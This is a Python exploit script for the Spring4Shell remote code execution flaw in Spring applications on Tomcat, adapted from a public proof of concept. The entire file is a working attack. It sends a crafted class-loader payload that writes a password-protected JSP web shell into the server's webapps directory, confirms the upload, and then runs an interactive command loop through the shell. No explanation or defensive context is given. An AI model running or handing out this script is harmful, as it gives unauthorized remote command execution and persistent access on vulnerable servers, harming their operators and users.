#!/usr/bin/env python3
# Spring4Shell Exploit
# Original Exploit: https://github.com/BobTheShoplifter/Spring4Shell-POC/

import requests
import argparse
from urllib.parse import urljoin

def exploit(url:str, filename:str, password:str, directory:str)->None:
    headers = {
        "suffix":"%><!--//",
        "c1":"Runtime",
        "c2":"<%",
        "DNT":"1",
        "Content-Type":"application/x-www-form-urlencoded"
    }
    data = f"class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22{password}%22.equals(request.getParameter(%22pwd%22)))%7B%20java.io.InputStream%20in%20%3D%20%25%7Bc1%7Di.getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%7D%20%25%7Bsuffix%7Di&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/{directory}&class.module.classLoader.resources.context.parent.pipeline.first.prefix={filename}&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat="

    try:
        requests.post(url,headers=headers,data=data,timeout=15,allow_redirects=False, verify=False)
        shellurl = urljoin(url, f"{filename}.jsp")
        shellgo = requests.get(shellurl,timeout=15,allow_redirects=False, verify=False)
        if shellgo.status_code == 200:
            print("Shell Uploaded Successfully!")
            print(f"Your shell can be found at: {shellurl}?pwd={password}&cmd=COMMAND")
        else:
            print("Exploit failed to upload")
        return shellurl
    except Exception as e:
        print(e)
        pass
    return ""

def get_username(shell_url:str, password:str):
    req_user = requests.get(f"{shell_url}?pwd={password}&cmd=whoami",timeout=15,allow_redirects=False, verify=False)
    if req_user.status_code == 200:
        username = req_user.text.split("\n")[0]
        req_pwd = requests.get(f"{shell_url}?pwd={password}&cmd=pwd",timeout=15,allow_redirects=False, verify=False)
        if req_pwd.status_code == 200:
            pwd = req_pwd.text.split("\n")[0]
            return username,pwd
    return ""
def web_shell(shell_url:str, password:str)->None:
    try:
        username,req_pwd = get_username(shell_url,password)
        user_input = input(f"{username}@{req_pwd} > ")
        while(user_input != "exit"):
            shellgo = requests.get(f"{shell_url}?pwd={password}&cmd={user_input}",timeout=15,allow_redirects=False, verify=False)
            if shellgo.status_code == 200:
                print(shellgo.text.split("<!--")[0])
            user_input = input(f"{username}@{req_pwd} > ")
    except Exception as e:
        print(e)
        pass

if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='Spring4Shell RCE Proof of Concept')
    parser.add_argument('url', help='Target URL')
    parser.add_argument("-f","--filename", help="Name of the file to upload (Default tomcatwar.jsp)", default="tomcatwar.jsp")
    parser.add_argument("-p","--password", help="Password to protect the shell with (Default: jLbUChd5RynKe93e)", default="jLbUChd5RynKe93e")
    parser.add_argument("-d","--directory", help="The upload path for the file (Default: ROOT)", default="ROOT")
    args = parser.parse_args()

    shell_url = exploit(args.url, args.filename.split(".")[0], args.password, args.directory)
    if(shell_url != ""):
        web_shell(shell_url, args.password)
